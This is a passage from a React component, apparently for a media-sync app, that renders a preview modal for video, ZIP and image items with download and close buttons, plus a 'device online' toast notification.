                            animate={{ scale: 1, opacity: 1 }}
                            exit={{ scale: 0.95, opacity: 0 }}
                            className="relative max-w-6xl w-full h-full flex items-center justify-center"
                            onClick={(e) => e.stopPropagation()}
                        >
                            {previewItem.resource_type === 'video' ? (
                                <video src={previewItem.url} controls autoPlay className="max-w-full max-h-full rounded-xl neo-surface" />
                            ) : previewItem.resource_type === 'zip' ? (
                                <div className="flex flex-col items-center justify-center p-12 neo-surface rounded-[2rem] border border-white/5 bg-black/40 backdrop-blur-xl max-w-sm w-full mx-4">
                                    <Folder className="w-24 h-24 text-accent mb-6 drop-shadow-[0_0_15px_rgba(var(--accent-rgb),0.5)]" />
                                    <h3 className="text-xl font-bold text-fg-1 text-center truncate w-full mb-2">{previewItem.name || 'Archive.zip'}</h3>
                                    <p className="text-sm text-fg-3 mb-8 text-center">This is a ZIP archive containing your synced media.</p>
                                    <button 
                                        onClick={async () => {
                                            try {
                                                const response = await fetch(previewItem.url);
                                                const blob = await response.blob();
                                                const blobUrl = window.URL.createObjectURL(blob);
                                                const link = document.createElement('a');
                                                link.href = blobUrl;
                                                link.download = previewItem.name || 'archive.zip';
                                                document.body.appendChild(link);
                                                link.click();
                                                document.body.removeChild(link);
                                                window.URL.revokeObjectURL(blobUrl);
                                            } catch (e) {
                                                const link = document.createElement('a');
                                                link.href = previewItem.url;
                                                link.download = previewItem.name || 'archive.zip';
                                                document.body.appendChild(link);
                                                link.click();
                                                document.body.removeChild(link);
                                            }
                                        }}
                                        className="flex items-center gap-2 px-6 py-3 rounded-2xl bg-accent text-black font-bold shadow-[0_0_15px_rgba(var(--accent-rgb),0.4)] hover:scale-105 active:scale-95 transition-all"
                                    >
                                        <Download className="w-5 h-5" /> Download ZIP
                                    </button>
                                </div>
                            ) : (
                                <img src={previewItem.url} alt="Preview" className="max-w-full max-h-full object-contain rounded-xl neo-surface" />
                            )}
                            
                            <div className="absolute top-4 right-4 flex items-center gap-3">
                                <button 
                                    onClick={async () => {
                                        try {
                                            const response = await fetch(previewItem.url);
                                            const blob = await response.blob();
                                            const blobUrl = window.URL.createObjectURL(blob);
                                            const link = document.createElement('a');
                                            link.href = blobUrl;
                                            link.download = previewItem.name || (previewItem.resource_type === 'video' ? 'video.mp4' : 'image.jpg');
                                            document.body.appendChild(link);
                                            link.click();
                                            document.body.removeChild(link);
                                            window.URL.revokeObjectURL(blobUrl);
                                        } catch (e) {
                                            const link = document.createElement('a');
                                            link.href = previewItem.url;
                                            link.download = previewItem.name || 'download';
                                            document.body.appendChild(link);
                                            link.click();
                                            document.body.removeChild(link);
                                        }
                                    }}
                                    className="p-3 rounded-full neo-button text-fg-1 hover:text-accent transition-colors shadow-lg bg-black/40 backdrop-blur-md border border-white/10"
                                    title="Download Media"
                                >
                                    <Download size={24} />
                                </button>
                                <button 
                                    onClick={() => setPreviewItem(null)} 
                                    className="p-3 rounded-full neo-button text-fg-1 hover:text-accent transition-colors shadow-lg bg-black/40 backdrop-blur-md border border-white/10"
                                    title="Close Preview"
                                >
                                    <X size={24} />
                                </button>
                            </div>
                        </motion.div>
                    </motion.div>
                )}
            </AnimatePresence>

            {/* Device Online Toast */}
            <AnimatePresence>
                {deviceToast && (
                    <motion.div
                        initial={{ opacity: 0, y: -50, scale: 0.95 }}
                        animate={{ opacity: 1, y: 0, scale: 1 }}
                        exit={{ opacity: 0, y: -20, scale: 0.95 }}
                        className="fixed top-20 right-6 z-[400] flex items-center gap-3 bg-[#121316]/95 backdrop-blur-xl border border-emerald-500/30 px-5 py-3.5 rounded-2xl shadow-[0_10px_35px_rgba(16,185,129,0.2)]"
                    >
                        <div className="w-3 h-3 rounded-full bg-emerald-500 shadow-[0_0_12px_#10b981] animate-pulse" />
                        <div>
                            <span className="text-xs font-bold text-white block">{deviceToast.name}</span>
                            <span className="text-[11px] text-emerald-400 font-medium">{deviceToast.message}</span>
                        </div>
                    </motion.div>
                )}
            </AnimatePresence>
        </div>
    );
}
